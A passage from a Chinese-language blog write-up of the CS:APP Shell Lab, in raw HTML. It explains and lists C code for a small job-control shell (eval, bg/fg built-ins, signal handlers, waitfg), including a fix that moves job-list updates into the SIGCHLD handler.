class-name">sigset_t</span> mask_all<span class="token punctuation">,</span> mask_one<span class="token punctuation">,</span> prev_one<span class="token punctuation">;</span><span class="token function">sigfillset</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>mask_all<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">sigemptyset</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>mask_one<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">sigaddset</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>mask_one<span class="token punctuation">,</span> SIGCHLD<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">sigprocmask</span><span class="token punctuation">(</span>SIG_BLOCK<span class="token punctuation">,</span> <span class="token operator">&amp;</span>mask_one<span class="token punctuation">,</span> <span class="token operator">&amp;</span>prev_one<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>pid <span class="token operator">=</span> <span class="token function">fork</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token function">sigprocmask</span><span class="token punctuation">(</span>SIG_SETMASK<span class="token punctuation">,</span> <span class="token operator">&amp;</span>prev_one<span class="token punctuation">,</span> <span class="token constant">NULL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">setpgid</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment">// 将进程组设置为自己的 pid</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">execve</span><span class="token punctuation">(</span>argv<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">,</span> argv<span class="token punctuation">,</span> environ<span class="token punctuation">)</span> <span class="token operator">&lt;</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"execve %s error\n"</span><span class="token punctuation">,</span> argv<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">exit</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>    <span class="token function">sigprocmask</span><span class="token punctuation">(</span>SIG_BLOCK<span class="token punctuation">,</span> <span class="token operator">&amp;</span>mask_all<span class="token punctuation">,</span> <span class="token constant">NULL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>bg<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token function">addjob</span><span class="token punctuation">(</span>jobs<span class="token punctuation">,</span> pid<span class="token punctuation">,</span> BG<span class="token punctuation">,</span> cmdline<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">sigprocmask</span><span class="token punctuation">(</span>SIG_SETMASK<span class="token punctuation">,</span> <span class="token operator">&amp;</span>prev_one<span class="token punctuation">,</span> <span class="token constant">NULL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"[%d] (%d) %s"</span><span class="token punctuation">,</span> <span class="token function">getjobpid</span><span class="token punctuation">(</span>jobs<span class="token punctuation">,</span> pid<span class="token punctuation">)</span><span class="token operator">-></span>jid<span class="token punctuation">,</span> pid<span class="token punctuation">,</span> cmdline<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>        <span class="token function">addjob</span><span class="token punctuation">(</span>jobs<span class="token punctuation">,</span> pid<span class="token punctuation">,</span> FG<span class="token punctuation">,</span> cmdline<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">sigprocmask</span><span class="token punctuation">(</span>SIG_SETMASK<span class="token punctuation">,</span> <span class="token operator">&amp;</span>prev_one<span class="token punctuation">,</span> <span class="token constant">NULL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">waitfg</span><span class="token punctuation">(</span>pid<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span></code></pre><h2 id="bg-fg-已停止作业恢复执行"><a href="#bg-fg-已停止作业恢复执行" class="headerlink" title="bg/fg: 已停止作业恢复执行"></a>bg/fg: 已停止作业恢复执行</h2><p>在内建命令中，<code>quit</code> 直接让程序正常退出即可，<code>jobs</code> 只需调用已实现的函数 <code>listjobs</code>，真正需要实现的是 <code>bg</code> 和 <code>fg</code>，它们的作用是将处于停止状态的作业恢复到后台（前台）执行。</p><p>实现方式无非分两步：</p><ol><li>参数解析，提取出作业 ID（分为 PID 和 JID）。</li><li>根据 <code>bg</code> 和 <code>fg</code> 的不同，分别进行处理，将作业运行在前台或是后台。</li></ol><p>参数解析其实也就是字符串处理，这部分与本章的异常控制流关系不大，在此不过多赘述。</p><p>根据参数得到对应的作业 <code>job</code> 后，首先需要它的运行状态更改为指定的状态（<code>BG</code> 或 <code>FG</code>），然后向 <code>job</code> 对应的进程组（<code>kill</code> 的 pid 参数为 <code>-job-&gt;pid</code>）发送 SIGCONT 信号，将内核在响应此信号后会重新调度该进程组内的所有进程执行。</p><pre class="language-c" data-language="c"><code class="language-c"><span class="token function">sigprocmask</span><span class="token punctuation">(</span>SIG_BLOCK<span class="token punctuation">,</span> <span class="token operator">&amp;</span>mask_all<span class="token punctuation">,</span> <span class="token operator">&amp;</span>prev_one<span class="token punctuation">)</span><span class="token punctuation">;</span>job<span class="token operator">-></span>state <span class="token operator">=</span> state<span class="token punctuation">;</span><span class="token function">sigprocmask</span><span class="token punctuation">(</span>SIG_SETMASK<span class="token punctuation">,</span> <span class="token operator">&amp;</span>prev_one<span class="token punctuation">,</span> <span class="token constant">NULL</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">kill</span><span class="token punctuation">(</span><span class="token operator">-</span>job<span class="token operator">-></span>pid<span class="token punctuation">,</span> SIGCONT<span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><p>最后，对于前台运行而言，父进程需要调用 <code>waitfg</code> 进行等待；对于后台运行而言，打印作业信息（具体格式见 <code>tshref.out</code> 的内容）。</p><pre class="language-c" data-language="c"><code class="language-c"><span class="token keyword">if</span> <span class="token punctuation">(</span>state <span class="token operator">==</span> FG<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token function">waitfg</span><span class="token punctuation">(</span>job<span class="token operator">-></span>pid<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"[%d] (%d)"</span><span class="token punctuation">,</span> job<span class="token operator">-></span>jid<span class="token punctuation">,</span> job<span class="token operator">-></span>pid<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> argv<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">!=</span> <span class="token constant">NULL</span><span class="token punctuation">;</span> <span class="token operator">++</span>i<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">" %s"</span><span class="token punctuation">,</span> argv<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></code></pre><h2 id="信号处理函数"><a href="#信号处理函数" class="headerlink" title="信号处理函数"></a>信号处理函数</h2><p>这部分看似简单，实则很容易出错，值得仔细说说。</p><p>最开始，我在 <code>sigint_handler</code> 和 <code>sigtstp_handler</code> 中进行了对作业队列的操作，在 <code>sigint_handler</code> 中使用 <code>deletejob</code> 删除作业，在 <code>sigtstp_handler</code> 中将作业状态修改为 <code>ST</code>。</p><p>这在前面的测试用例中工作一切正常，但在最后的 trace16 中，程序却阻塞在了 <code>mystop.c</code> 的 <code>if (kill(-pid, SIGTSTP) &lt; 0)</code> 位置，而如果按下键盘的 ctrl-c 或 ctrl-z 却能够响应信号，程序也正常终止或暂停。</p><p>通过查阅网上资料，在 <a href="https://zhuanlan.zhihu.com/p/593070389">实验四：Shell-Lab（下） - 知乎</a> 找到了问题的原因。</p><p>程序 <code>mystop</code> 使用 <code>kill</code> 发送信号时，信号是直接发送到内核进行处理的，而不会经过 shell，shell 也就不会调用 <code>sigtstp_handler</code> 将作业状态更改为 <code>ST</code>，shell 因此认为 <code>mystop</code> 程序一直处于前台运行状态，也就保持阻塞。</p><p>既然 <code>sigint_handler</code> 和 <code>sigtstp_handler</code> 在这种情况下无法被调用，那么就需要在其他信号处理函数中进行处理，答案便是 <code>sigchld_handler</code>。事实上，子进程并非只有在终止时才向父进程发送 SIGCHLD 信号，而是在状态发生改变后就会。我们可以利用这一点，将所有对作业队列的操作都放到 <code>sigchld_handler</code> 中，而 <code>sigint_handler</code> 和 <code>sigtstp_handler</code> 只作一个转发作用。</p><pre class="language-c" data-language="c"><code class="language-c"><span class="token keyword">void</span> <span class="token function">sigchld_handler</span><span class="token punctuation">(</span><span class="token keyword">int</span> sig<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>    <span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>pid <span class="token operator">=</span> <span class="token function">waitpid</span><span class="token punctuation">(</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>status<span class="token punctuation">,</span> WNOHANG <span class="token operator">|</span> WUNTRACED<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">></span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">WIFEXITED</span><span class="token punctuation">(</span>status<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>             <span class="token comment">// 子进程正常退出</span>            <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>        <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">WIFSTOPPED</span><span class="token punctuation">(</span>status<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>     <span class="token comment">// 子进程暂停</span>            <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>        <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">WIFSIGNALED</span><span class="token punctuation">(</span>status<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token comment">// 子进程终止</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span></code></pre><h1 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h1><h2 id="eval"><a href="#eval" class="headerlink" title="eval"></a>eval</h2><pre class="language-c" data-language="c"><code class="language-c"><span class="token keyword">void</span> <span class="token function">eval</span><span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span>cmdline<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">int</span> bg<span class="token punctuation">;</span>    <span class="token class-name">pid_t</span> pid<span class="token punctuation">;</span>    <span class="token keyword">char</span> <span class="token operator">*</span>argv<span class="token punctuation">[</span>MAXARGS<span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token class-name">sigset_t</span> mask_all<span class="token punctuation">,</span> mask_one<span class="token punctuation">,</span> prev_one<span class="token punctuation">;</span>  <span class="token comment">// 用于父-子进程同步</span>        <span class="token function">sigfillset</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>mask_all<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">sigemptyset</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>mask_one<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">sigaddset</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>mask_one<span class="token punctuation">,</span> SIGCHLD<span class="token punctuation">)</span><span class="token punctuation">;</span>    bg <span class="token operator">=</span> <span class="token function">parseline</span><span class="token punctuation">(</span>cmdline<span class="token punctuation">,</span> argv<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">builtin_cmd</span><span class="token punctuation">(</span>argv<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token keyword">return</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">access</span><span class="token punctuation">(</span>argv<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">,</span> X_OK<span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"%s: Command not found\n"</span><span class="token punctuation">,</span> argv<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token function">sigprocmask</span><span class="token punctuation">(</span>SIG_BLOCK<span class="token punctuation">,</span> <span class="token operator">&amp;</span>mask_one<span class="token punctuation">,</span> <span class="token operator">&amp;</span>prev_one<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>pid <span class="token operator">=</span> <span class="token function">fork</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token function">sigprocmask</span><span class="token punctuation">(</span>SIG_SETMASK<span class="token punctuation">,</span> <span class="token operator">&amp;</span>prev_one<span class="token punctuation">,</span> <span class="token constant">NULL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">setpgid</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment">// 将进程组设置为自己的 pid</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">execve</span><span class="token punctuation">(</span>argv<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">,</span> argv<span class="token punctuation">,</span> environ<span class="token punctuation">)</span> <span class="token operator">&lt;</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"execve %s error\n"</span><span class="token punctuation">,</span> argv<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token function">exit</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>        <span class="token function">sigprocmask</span><span class="token punctuation">(</span>SIG_BLOCK<span class="token punctuation">,</span> <span class="token operator">&amp;</span>mask_all<span class="token punctuation">,</span> <span class="token constant">NULL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>bg<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token function">addjob</span><span class="token punctuation">(</span>jobs<span class="token punctuation">,</span> pid<span class="token punctuation">,</span> BG<span class="token punctuation">,</span> cmdline<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token function">sigprocmask</span><span class="token punctuation">(</span>SIG_SETMASK<span class="token punctuation">,</span> <span class="token operator">&amp;</span>prev_one<span class="token punctuation">,</span> <span class="token constant">NULL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"[%d] (%d) %s"</span><span class="token punctuation">,</span> <span class="token function">getjobpid</span><span class="token punctuation">(</span>jobs<span class="token punctuation">,</span> pid<span class="token punctuation">)</span><span class="token operator">-></span>jid<span class="token punctuation">,</span> pid<span class="token punctuation">,</span> cmdline<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>            <span class="token function">addjob</span><span class="token punctuation">(</span>jobs<span class="token punctuation">,</span> pid<span class="token punctuation">,</span> FG<span class="token punctuation">,</span> cmdline<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token function">sigprocmask</span><span class="token punctuation">(</span>SIG_SETMASK<span class="token punctuation">,</span> <span class="token operator">&amp;</span>prev_one<span class="token punctuation">,</span> <span class="token constant">NULL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token function">waitfg</span><span class="token punctuation">(</span>pid<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span></code></pre><h2 id="built-cmd"><a href="#built-cmd" class="headerlink" title="built_cmd"></a>built_cmd</h2><pre class="language-c" data-language="c"><code class="language-c"><span class="token keyword">int</span> <span class="token function">builtin_cmd</span><span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span>argv<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>argv<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> <span class="token number">1</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">strcmp</span><span class="token punctuation">(</span>argv<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token string">"quit"</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token function">exit</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">strcmp</span><span class="token punctuation">(</span>argv<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token string">"jobs"</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token function">listjobs</span><span class="token punctuation">(</span>jobs<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">strcmp</span><span class="token punctuation">(</span>argv<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token string">"bg"</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token function">do_bgfg</span><span class="token punctuation">(</span>argv<span class="token punctuation">,</span> BG<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">strcmp</span><span class="token punctuation">(</span>argv<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token string">"fg"</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token function">do_bgfg</span><span class="token punctuation">(</span>argv<span class="token punctuation">,</span> FG<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">return</span> <span class="token number">1</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></code></pre><h2 id="do-bgfg"><a href="#do-bgfg" class="headerlink" title="do_bgfg"></a>do_bgfg</h2><pre class="language-c" data-language="c"><code class="language-c"><span class="token comment">// 根据字符串 arg（格式为 %jid 或 pid）获取对应的 job</span><span class="token comment">// 成功返回 job 指针，失败返回 NULL</span><span class="token keyword">struct</span> <span class="token class-name">job_t</span> <span class="token operator">*</span><span class="token function">getjob_arg</span><span class="token punctuation">(</span><span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span>arg<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">int</span> isjid<span class="token punctuation">,</span> id<span class="token punctuation">;</span>    <span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span>parg<span class="token punctuation">;</span>    <span class="token keyword">struct</span> <span class="token class-name">job_t</span> <span class="token operator">*</span>job<span class="token punctuation">;</span>    isjid <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>arg<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token string">'%'</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        isjid <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span>        <span class="token operator">++</span>arg<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    parg <span class="token operator">=</span> arg<span class="token punctuation">;</span>    <span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token operator">*</span>parg <span class="token operator">!=</span> <span class="token string">'\0'</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">isdigit</span><span class="token punctuation">(</span><span class="token operator">*</span>parg<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"bg/fg: argument must be a PID or %%jobid\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">return</span> <span class="token constant">NULL</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token operator">++</span>parg<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    id <span class="token operator">=</span> <span class="token function">atoi</span><span class="token punctuation">(</span>arg<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>isjid<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        job <span class="token operator">=</span> <span class="token function">getjobjid</span><span class="token punctuation">(</span>jobs<span class="token punctuation">,</span> id<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>job <span class="token operator">==</span> <span class="token constant">NULL</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"(%s): No such process\n"</span><span class="token punctuation">,</span> arg<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>        job <span class="token operator">=</span> <span class="token function">getjobpid</span><span class="token punctuation">(</span>jobs<span class="token punctuation">,</span> id<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>job <span class="token operator">==</span> <span class="token constant">NULL</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"%s: No such job\n"</span><span class="token punctuation">,</span> arg<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">return</span> job<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token comment">// 与题目提供的接口有些不同（加了个 state 参数），感觉这样更好处理一些...</span><span class="token keyword">void</span> <span class="token function">do_bgfg</span><span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span>argv<span class="token punctuation">,</span> <span class="token keyword">int</span> state<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token class-name">sigset_t</span> mask_all<span class="token punctuation">,</span> prev_one<span class="token punctuation">;</span>    <span class="token keyword">struct</span> <span class="token class-name">job_t</span> <span class="token operator">*</span>job<span class="token punctuation">;</span>    <span class="token function">sigfillset</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>mask_all<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>argv<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token constant">NULL</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"fg command requires PID or %%jobid argument\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    job <span class="token operator">=</span> <span class="token function">getjob_arg</span><span class="token punctuation">(</span>argv<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>job <span class="token operator">==</span> <span class="token constant">NULL</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">return</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token function">sigprocmask</span><span class="token punctuation">(</span>SIG_BLOCK<span class="token punctuation">,</span> <span class="token operator">&amp;</span>mask_all<span class="token punctuation">,</span> <span class="token operator">&amp;</span>prev_one<span class="token punctuation">)</span><span class="token punctuation">;</span>    job<span class="token operator">-></span>state <span class="token operator">=</span> state<span class="token punctuation">;</span>    <span class="token function">sigprocmask</span><span class="token punctuation">(</span>SIG_SETMASK<span class="token punctuation">,</span> <span class="token operator">&amp;</span>prev_one<span class="token punctuation">,</span> <span class="token constant">NULL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">kill</span><span class="token punctuation">(</span><span class="token operator">-</span>job<span class="token operator">-></span>pid<span class="token punctuation">,</span> SIGCONT<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>state <span class="token operator">==</span> FG<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token function">waitfg</span><span class="token punctuation">(</span>job<span class="token operator">-></span>pid<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"[%d] (%d)"</span><span class="token punctuation">,</span> job<span class="token operator">-></span>jid<span class="token punctuation">,</span> job<span class="token operator">-></span>pid<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> argv<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">!=</span> <span class="token constant">NULL</span><span class="token punctuation">;</span> <span class="token operator">++</span>i<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">" %s"</span><span class="token punctuation">,</span> argv<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span></code></pre><h2 id="waitfg"><a href="#waitfg" class="headerlink" title="waitfg"></a>waitfg</h2><pre class="language-c" data-language="c"><code class="language-c"><span class="token keyword">void</span> <span class="token function">waitfg</span><span class="token punctuation">(</span><span class="token class-name">pid_t</span> pid<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">struct</span> <span class="token class-name">job_t</span> <span class="token operator">*</span>job <span class="token operator">=</span> <span class="token function">getjobpid</span><span class="token punctuation">(</span>jobs<span class="token punctuation">,</span> pid<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>job <span class="token operator">==</span> <span class="token constant">NULL</span> <span class="token operator">||</span> 